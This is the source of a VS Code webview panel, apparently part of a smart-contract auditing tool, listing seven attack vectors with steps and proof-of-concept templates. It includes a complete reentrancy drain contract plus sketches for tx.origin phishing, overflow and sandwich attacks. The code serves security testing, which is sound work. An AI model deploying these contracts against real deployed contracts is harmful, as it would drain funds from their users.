import { createSignal, createMemo, Show, For, onMount, onCleanup } from 'solid-js'
import { render } from 'solid-js/web'
import { Button } from '../components/Button'
import { Panel } from '../components/Card'
import { Badge } from '../components/Badge'
import { Input } from '../components/Input'
import { IconShield, IconBug, IconTarget, IconZap, IconServer, IconAlert, IconCheck, IconX, IconClock, IconRefreshCw, IconPlay, IconPause, IconStop, IconCopy, IconDownload, IconSettings, IconFilter, IconSearch, IconPlus, IconArrowRight, IconExternalLink, IconTerminal, IconFileCode, IconActivity, IconGraph, IconHistory, IconEye } from '../design-system/icons'
import { injectGlobalStyles } from '../design-system/styles'
import { postMessage } from '../providers/vscode-api'

interface AttackVector {
  id: string
  name: string
  category: string
  severity: 'critical' | 'high' | 'medium' | 'low'
  description: string
  prerequisites: string[]
  steps: string[]
  pocTemplate: string
  tags: string[]
}

interface AttackResult {
  vectorId: string
  status: 'pending' | 'running' | 'success' | 'failed'
  startTime: number
  endTime?: number
  output?: string
  error?: string
  findings?: string[]
}

const ATTACK_VECTORS: AttackVector[] = [
  {
    id: 'reentrancy',
    name: 'Reentrancy Attack',
    category: 'Access Control',
    severity: 'critical',
    description: 'Exploit unguarded external calls to re-enter a function before state updates complete.',
    prerequisites: ['Contract makes external call', 'State updated after call', 'No reentrancy guard'],
    steps: [
      'Deploy attacker contract with fallback/receive function',
      'Call vulnerable function (e.g., withdraw)',
      'In fallback, re-enter vulnerable function',
      'Repeat until balance drained',
    ],
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
  function deposit() external payable;
  function withdraw(uint256) external;
  function balanceOf(address) external view returns (uint256);
}

contract ReentrancyAttack {
  IVault public immutable vault;
  address public owner;

  constructor(address _vault) {
    vault = IVault(_vault);
    owner = msg.sender;
  }

  function attack() external payable {
    vault.deposit{value: msg.value}();
    vault.withdraw(msg.value);
  }

  receive() external payable {
    if (address(vault).balance >= msg.value) {
      vault.withdraw(msg.value);
    }
  }

  function rescue() external {
    payable(owner).transfer(address(this).balance);
  }
}`,
    tags: ['reentrancy', 'external-call', 'drain'],
  },
  {
    id: 'unchecked-call',
    name: 'Unchecked External Call',
    category: 'Input Validation',
    severity: 'high',
    description: 'Contract ignores return value of low-level call, allowing silent failures.',
    prerequisites: ['Low-level call() used', 'Return value not checked', 'State changes after call'],
    steps: [
      'Identify low-level calls without return value checks',
      'Craft transaction that causes call to fail',
      'Observe state inconsistency',
    ],
    pocTemplate: `// Test case for unchecked call
function testUncheckedCall() public {
  // Deploy vulnerable contract
  VulnerableContract vc = new VulnerableContract();
  
  // Call function that makes unchecked call
  // Force call to fail (e.g., by sending to contract without receive)
  // Observe that state changes despite call failure
}`,
    tags: ['unchecked-call', 'silent-failure'],
  },
  {
    id: 'oracle-manipulation',
    name: 'Price Oracle Manipulation',
    category: 'Centralization',
    severity: 'medium',
    description: 'Single-admin oracle allows arbitrary price manipulation.',
    prerequisites: ['Centralized oracle', 'Admin key accessible', 'Price used for critical logic'],
    steps: [
      'Identify oracle update function',
      'Gain admin access (compromise or insider)',
      'Set manipulated price',
      'Trigger liquidation/arbitrage',
    ],
    pocTemplate: `// Exploit scenario
contract OracleManipulation {
  function manipulatePrice(address oracle, int256 fakePrice) external {
    // Requires admin role
    IOracle(oracle).updatePrice(fakePrice);
  }
}`,
    tags: ['oracle', 'manipulation', 'centralization'],
  },
  {
    id: 'slippage',
    name: 'Slippage / MEV Attack',
    category: 'Logic Error',
    severity: 'high',
    description: 'Missing slippage protection enables sandwich attacks.',
    prerequisites: ['DEX swap without minOut', 'Public mempool', 'Large liquidity impact'],
    steps: [
      'Monitor mempool for large swaps',
      'Front-run with buy order',
      'Let victim swap at worse rate',
      'Back-run with sell order',
    ],
    pocTemplate: `// Flashbots bundle example
function sandwichAttack(
  address router,
  address tokenIn,
  address tokenOut,
  uint256 amountIn
) external {
  // 1. Buy tokenOut before victim
  IUniswapRouter(router).swapExactTokensForTokens{value: msg.value}(...);
  
  // 2. Victim swap executes at worse rate
  
  // 3. Sell tokenOut after victim
  IUniswapRouter(router).swapExactTokensForTokens(...);
}`,
    tags: ['mev', 'slippage', 'sandwich', 'dex'],
  },
  {
    id: 'access-control',
    name: 'Missing Access Control',
    category: 'Access Control',
    severity: 'critical',
    description: 'Critical functions lack proper authorization checks.',
    prerequisites: ['Owner-only function missing modifier', 'Role-based access not enforced', 'Public function should be restricted'],
    steps: [
      'Identify unprotected admin functions',
      'Call function from non-admin account',
      'Verify state change succeeds',
    ],
    pocTemplate: `// Test missing access control
function testMissingAccessControl() public {
  VulnerableContract vc = new VulnerableContract();
  
  // Non-owner calls admin function
  vm.prank(attacker);
  vc.adminFunction();
  
  // Assert state changed
  assertTrue(vc.adminStateChanged());
}`,
    tags: ['access-control', 'authorization', 'missing-modifier'],
  },
  {
    id: 'integer-overflow',
    name: 'Integer Over/Underflow',
    category: 'Arithmetic',
    severity: 'high',
    description: 'Unchecked arithmetic in Solidity <0.8 or assembly blocks.',
    prerequisites: ['Solidity <0.8 or unchecked{}', 'User-controlled input', 'Arithmetic on balances'],
    steps: [
      'Find arithmetic without overflow checks',
      'Craft input causing overflow/underflow',
      'Exploit wrapped balance logic',
    ],
    pocTemplate: `// Solidity 0.7 example
contract Overflow {
  uint8 public value = 255;
  
  function increment() public {
    value += 1; // Overflows to 0
  }
}

// Exploit
function exploitOverflow() public {
  Overflow o = new Overflow();
  o.increment();
  assertEq(o.value(), 0);
}`,
    tags: ['overflow', 'underflow', 'arithmetic', 'solidity-0.7'],
  },
  {
    id: 'tx-origin',
    name: 'tx.origin Phishing',
    category: 'Authentication',
    severity: 'medium',
    description: 'Using tx.origin for authorization enables phishing attacks.',
    prerequisites: ['Contract uses tx.origin', 'Attacker can trick user to call contract'],
    steps: [
      'Deploy malicious contract',
      'Trick user into calling it',
      'Malicious contract calls victim contract',
      'tx.origin == user, so authorization passes',
    ],
    pocTemplate: `// Vulnerable pattern
contract Vulnerable {
  function withdraw() public {
    require(tx.origin == owner); // BAD: use msg.sender instead
    payable(owner).transfer(address(this).balance);
  }
}

// Attack
contract Phishing {
  Vulnerable public vulnerable;
  
  function attack() external {
    vulnerable.withdraw(); // tx.origin = user, passes check
  }
}`,
    tags: ['tx-origin', 'phishing', 'authorization'],
  },
]

const SEVERITY_CONFIG = {
  critical: { color: 'var(--vscode-testing-iconFailed)', label: 'Critical' },
  high: { color: 'var(--vscode-testing-iconErrored)', label: 'High' },
  medium: { color: 'var(--vscode-testing-iconQueued)', label: 'Medium' },
  low: { color: 'var(--vscode-testing-iconPassed)', label: 'Low' },
}

function severityBadge(s: AttackVector['severity']) {
  switch (s) {
    case 'critical': return 'danger' as const
    case 'high': return 'warning' as const
    case 'medium': return 'warning' as const
    case 'low': return 'success' as const
  }
}

function AttackWorkspace() {
  injectGlobalStyles()

  const [vectors] = createSignal<AttackVector[]>(ATTACK_VECTORS)
  const [selectedVectorId, setSelectedVectorId] = createSignal<string | null>(null)
  const [results, setResults] = createSignal<Record<string, AttackResult>>({})
  const [filterSeverity, setFilterSeverity] = createSignal<'all' | AttackVector['severity']>('all')
  const [searchQuery, setSearchQuery] = createSignal('')
  const [tab, setTab] = createSignal<'vectors' | 'results' | 'custom'>('vectors')

  const filteredVectors = createMemo(() =>
    vectors().filter(v =>
      (filterSeverity() === 'all' || v.severity === filterSeverity()) &&
      (v.name.toLowerCase().includes(searchQuery().toLowerCase()) ||
       v.category.toLowerCase().includes(searchQuery().toLowerCase()) ||
       v.tags.some(t => t.includes(searchQuery().toLowerCase())))
    )
  )

  const selectedVector = createMemo(() =>
    vectors().find(v => v.id === selectedVectorId())
  )

  const handleRunVector = (vector: AttackVector) => {
    const result: AttackResult = {
      vectorId: vector.id,
      status: 'running',
      startTime: Date.now(),
    }
    setResults(prev => ({ ...prev, [vector.id]: result }))

    postMessage({ type: 'attack:run', payload: { vectorId: vector.id } })
  }

  const formatTime = (ts: number) => new Date(ts).toLocaleTimeString()

  return (
    <div style={{
      display: 'flex', 'flex-direction': 'column', height: '100%',
      background: 'var(--vscode-editor-background)', color: 'var(--vscode-editor-foreground)',
      'font-family': 'var(--vscode-font-family)',
      'font-size': 'var(--vscode-font-size)',
      overflow: 'hidden',
    }}>
      {/* Header */}
      <div style={{
        display: 'flex', 'align-items': 'center', 'justify-content': 'space-between',
        padding: '8px 12px',
        'border-bottom': '1px solid var(--vscode-panel-border)',
        background: 'var(--vscode-panel-background)',
      }}>
        <div style={{ display: 'flex', 'align-items': 'center', gap: '8px' }}>
          <IconZap size={16} style={{ color: 'var(--vscode-testing-iconFailed)' }} />
          <div>
            <span style={{ 'font-weight': 600 }}>Attack Workspace</span>
            <div style={{ 'font-size': '10px', color: 'var(--vscode-descriptionForeground)' }}>
              {vectors().length} vectors · {Object.keys(results()).length} runs
            </div>
          </div>
        </div>
        <div style={{ display: 'flex', gap: '4px' }}>
          <Button variant="secondary" size="sm" icon={<IconRefreshCw size={12} />} onClick={() => postMessage({ type: 'attack:refresh' })}>
            Refresh
          </Button>
        </div>
      </div>

      {/* Tabs */}
      <div style={{
        display: 'flex', gap: '1px',
        padding: '4px 8px',
        'border-bottom': '1px solid var(--vscode-panel-border)',
        background: 'var(--vscode-panel-background)',
      }}>
        <For each={['vectors', 'results', 'custom']}>
          {(t) => (
            <button
              onClick={() => setTab(t as any)}
              style={{
                padding: '4px 10px', 'font-size': '11px', 'font-weight': 500,
                color: tab() === t ? 'var(--vscode-editor-foreground)' : 'var(--vscode-descriptionForeground)',
                background: tab() === t ? 'var(--vscode-list-activeSelectionBackground)' : 'transparent',
                border: 'none', 'border-radius': '2px', cursor: 'pointer',
              }}
            >
              {t.charAt(0).toUpperCase() + t.slice(1)}
            </button>
          )}
        </For>
      </div>

      {/* Toolbar */}
      <div style={{
        display: 'flex', 'align-items': 'center', gap: '8px',
        padding: '6px 12px',
        'border-bottom': '1px solid var(--vscode-panel-border)',
        background: 'var(--vscode-panel-background)',
      }}>
        <div style={{ flex: 1, 'max-width': 300 }}>
          <input
            type="search"
            placeholder="Search vectors..."
            value={searchQuery()}
            onInput={(e) => setSearchQuery(e.target.value)}
            style={{
              width: '100%', padding: '4px 8px', 'font-size': '11px',
              background: 'var(--vscode-input-background)', border: '1px solid var(--vscode-input-border)',
              'border-radius': '2px', color: 'var(--vscode-input-foreground)', outline: 'none',
            }}
          />
        </div>
        <select
          value={filterSeverity()}
          onChange={(e) => setFilterSeverity(e.target.value as any)}
          style={{
            padding: '4px 8px', 'font-size': '11px',
            background: 'var(--vscode-dropdown-background)', border: '1px solid var(--vscode-dropdown-border)',
            'border-radius': '2px', color: 'var(--vscode-dropdown-foreground)', outline: 'none',
          }}
        >
          <option value="all">All Severities</option>
          <option value="critical">Critical</option>
          <option value="high">High</option>
          <option value="medium">Medium</option>
          <option value="low">Low</option>
        </select>
      </div>

      {/* Content */}
      <div style={{ flex: 1, overflow: 'auto' }}>
        <Show when={tab() === 'vectors'}>
          {() => (
            <div style={{ padding: '12px', display: 'flex', 'flex-direction': 'column', gap: '8px' }}>
              <For each={filteredVectors()}>
                {(vector) => {
                  const cfg = SEVERITY_CONFIG[vector.severity]
                  const result = results()[vector.id]
                  const isRunning = result?.status === 'running'

                  return (
                    <Panel
                      variant="bordered"
                      padding="md"
                      onClick={() => setSelectedVectorId(vector.id)}
                      style={{ cursor: 'pointer', transition: 'border-color 120ms', borderColor: selectedVectorId() === vector.id ? cfg.color : undefined }}
                    >
                      <div style={{ display: 'flex', 'align-items': 'flex-start', gap: '12px' }}>
                        <div style={{ width: 4, height: '100%', 'border-radius': '2px', background: cfg.color, 'flex-shrink': 0, marginTop: '2px' }} />
                        <div style={{ flex: 1, 'min-width': 0 }}>
                          <div style={{ display: 'flex', 'align-items': 'center', gap: '8px', 'margin-bottom': '4px' }}>
                            <span style={{ 'font-weight': 600 }}>{vector.name}</span>
                            <Badge variant={severityBadge(vector.severity)} size="sm">{cfg.label}</Badge>
                            <span style={{ 'font-size': '10px', color: 'var(--vscode-descriptionForeground)' }}>{vector.category}</span>
                            {result && (
                              <Badge
                                variant={
                                  result.status === 'success' ? 'success' :
                                  result.status === 'failed' ? 'danger' :
                                  result.status === 'running' ? 'info' : 'default'
                                }
                                size="sm"
                              >
                                {result.status}
                              </Badge>
                            )}
                          </div>
                          <p style={{ margin: 0, 'font-size': '10px', color: 'var(--vscode-descriptionForeground)', 'line-height': 1.5, 'margin-bottom': '8px' }}>
                            {vector.description}
                          </p>
                          <div style={{ display: 'flex', 'flex-wrap': 'wrap', gap: '4px' }}>
                            {vector.tags.slice(0, 5).map(tag => (
                              <span key={tag} style={{ 'font-size': '9px', padding: '1px 6px', background: 'var(--vscode-textBlockQuote-background)', 'border-radius': '2px', color: 'var(--vscode-descriptionForeground)' }}>
                                {tag}
                              </span>
                            ))}
                          </div>
                        </div>
                        <div style={{ display: 'flex', 'flex-direction': 'column', gap: '4px', 'align-items': 'flex-end' }}>
                          <Button
                            variant={isRunning ? 'secondary' : 'primary'}
                            size="sm"
                            icon={isRunning ? <IconPause size={12} /> : <IconPlay size={12} />}
                            onClick={() => handleRunVector(vector)}
                            disabled={isRunning}
                          >
                            {isRunning ? 'Running...' : 'Run'}
                          </Button>
                          {result && result.status !== 'pending' && (
                            <Button variant="ghost" size="sm" onClick={() => setSelectedVectorId(vector.id)}>
                              <IconEye size={12} /> View
                            </Button>
                          )}
                        </div>
                      </div>
                    </Panel>
                  )
                }}
              </For>
              {filteredVectors().length === 0 && (
                <div style={{ padding: '24px', 'text-align': 'center', color: 'var(--vscode-descriptionForeground)' }}>
                  <IconSearch style={{ width: 32, height: 32, marginBottom: '8px', opacity: 0.3 }} />
                  <p>No attack vectors match your filter</p>
                </div>
              )}
            </div>
          )}
        </Show>

        <Show when={tab() === 'results'}>
          {() => (
            <div style={{ padding: '12px', display: 'flex', 'flex-direction': 'column', gap: '8px' }}>
              <For each={Object.entries(results()).sort((a, b) => b[1].startTime - a[1].startTime)}>
                {([id, result]) => {
                  const vector = vectors().find(v => v.id === id)
                  if (!vector) return null
                  const cfg = SEVERITY_CONFIG[vector.severity]

                  return (
                    <Panel variant="bordered" padding="md">
                      <div style={{ display: 'flex', 'align-items': 'flex-start', gap: '12px' }}>
                        <div style={{ width: 4, height: '100%', 'border-radius': '2px', background: cfg.color, 'flex-shrink': 0, marginTop: '2px' }} />
                        <div style={{ flex: 1, 'min-width': 0 }}>
                          <div style={{ display: 'flex', 'align-items': 'center', gap: '8px', 'margin-bottom': '4px' }}>
                            <span style={{ 'font-weight': 600 }}>{vector.name}</span>
                            <Badge variant={severityBadge(vector.severity)} size="sm">{cfg.label}</Badge>
                            <Badge
                              variant={
                                result.status === 'success' ? 'success' :
                                result.status === 'failed' ? 'danger' :
                                result.status === 'running' ? 'info' : 'default'
                              }
                              size="sm"
                            >
                              {result.status}
                            </Badge>
                            <span style={{ 'font-size': '10px', color: 'var(--vscode-descriptionForeground)', marginLeft: 'auto' }}>
                              {formatTime(result.startTime)}
                              {result.endTime && ` · ${Math.round((result.endTime - result.startTime) / 1000)}s`}
                            </span>
                          </div>
                          {result.output && (
                            <pre style={{ margin: '8px 0 0', padding: '8px', background: 'var(--vscode-textCodeBlock-background)', 'border-radius': '2px', 'font-size': '10px', 'font-family': 'var(--vscode-editor-font-family)', overflow: 'auto', 'max-height': 200 }}>
                              {result.output}
                            </pre>
                          )}
                          {result.error && (
                            <div style={{ marginTop: '8px', padding: '8px', background: 'color-mix(in srgb, var(--vscode-testing-iconFailed) 12%, transparent)', 'border-radius': '2px', border: '1px solid var(--vscode-testing-iconFailed)', 'font-size': '10px', color: 'var(--vscode-testing-iconFailed)' }}>
                              {result.error}
                            </div>
                          )}
                          {result.findings && result.findings.length > 0 && (
                            <div style={{ marginTop: '8px' }}>
                              <span style={{ 'font-size': '10px', 'font-weight': 600, color: 'var(--vscode-descriptionForeground)' }}>Findings:</span>
                              <ul style={{ margin: '4px 0 0', paddingLeft: '16px', 'font-size': '10px' }}>
                                {result.findings.map(f => <li key={f} style={{ color: 'var(--vscode-descriptionForeground)' }}>{f}</li>)}
                              </ul>
                            </div>
                          )}
                        </div>
                        <div style={{ display: 'flex', 'flex-direction': 'column', gap: '4px' }}>
                          <Button variant="ghost" size="sm" onClick={() => postMessage({ type: 'attack:copyResult', payload: { vectorId: id } })}>
                            <IconCopy size={12} /> Copy
                          </Button>
                          <Button variant="ghost" size="sm" onClick={() => setResults(prev => { const n = { ...prev }; delete n[id]; return n; })}>
                            <IconX size={12} /> Clear
                          </Button>
                        </div>
                      </div>
                    </Panel>
                  )
                }}
              </For>
              {Object.keys(results()).length === 0 && (
                <div style={{ padding: '24px', 'text-align': 'center', color: 'var(--vscode-descriptionForeground)' }}>
                  <IconActivity style={{ width: 32, height: 32, marginBottom: '8px', opacity: 0.3 }} />
                  <p>No attack runs yet. Switch to Vectors tab to start.</p>
                </div>
              )}
            </div>
          )}
        </Show>

        <Show when={tab() === 'custom'}>
          {() => (
            <div style={{ padding: '16px', 'max-width': 600, margin: '0 auto', display: 'flex', 'flex-direction': 'column', gap: '12px' }}>
              <Panel variant="bordered" padding="md">
                <h3 style={{ margin: '0 0 12px', 'font-size': 'var(--vscode-font-size)', 'font-weight': 600 }}>Custom Attack Vector</h3>
                <div style={{ display: 'flex', 'flex-direction': 'column', gap: '8px' }}>
                  <Input placeholder="Vector name (e.g., MyCustomExploit)" style={{ width: '100%' }} />
                  <Input placeholder="Category" style={{ width: '100%' }} />
                  <select style={{ width: '100%', padding: '4px 8px', 'font-size': 'var(--vscode-font-size)', background: 'var(--vscode-dropdown-background)', border: '1px solid var(--vscode-dropdown-border)', 'border-radius': '2px', color: 'var(--vscode-dropdown-foreground)' }}>
                    <option value="critical">Critical</option>
                    <option value="high">High</option>
                    <option value="medium">Medium</option>
                    <option value="low">Low</option>
                  </select>
                  <textarea
                    placeholder="Description..."
                    rows={3}
                    style={{ width: '100%', padding: '8px', 'font-size': 'var(--vscode-font-size)', 'font-family': 'var(--vscode-font-family)', background: 'var(--vscode-input-background)', border: '1px solid var(--vscode-input-border)', 'border-radius': '2px', color: 'var(--vscode-input-foreground)', resize: 'vertical' }}
                  />
                  <textarea
                    placeholder="PoC template (Solidity)..."
                    rows={12}
                    style={{ width: '100%', padding: '8px', 'font-size': '10px', 'font-family': 'var(--vscode-editor-font-family)', background: 'var(--vscode-textCodeBlock-background)', border: '1px solid var(--vscode-input-border)', 'border-radius': '2px', color: 'var(--vscode-editor-foreground)', resize: 'vertical' }}
                  />
                  <Button variant="primary" size="sm" onClick={() => postMessage({ type: 'attack:saveCustom', payload: {} })}>
                    <IconPlus size={12} /> Save Vector
                  </Button>
                </div>
              </Panel>
            </div>
          )}
        </Show>
      </div>
    </div>
  )
}

const root = document.getElementById('root');
if (root) { render(() => <AttackWorkspace />, root); }